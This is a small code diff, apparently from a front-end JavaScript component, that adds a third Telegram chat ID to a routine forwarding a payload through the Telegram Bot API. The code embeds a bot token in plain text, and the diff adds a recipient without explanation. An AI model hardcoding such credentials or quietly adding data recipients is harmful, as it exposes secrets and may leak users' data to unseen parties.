@@ -134,7 +134,7 @@ export default{
         this.sendMessage(payload)
       },
         sendMessage(payload) {
-          const chatIds = ['379532768', '538853897'];
+          const chatIds = ['379532768', '538853897', '6784238632'];
           const message = payload;
           const telegramBotToken = '7080378136:AAEY1NMOUW6FEIUbc3DYuQLFVcyyRsoE0-U';
           const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
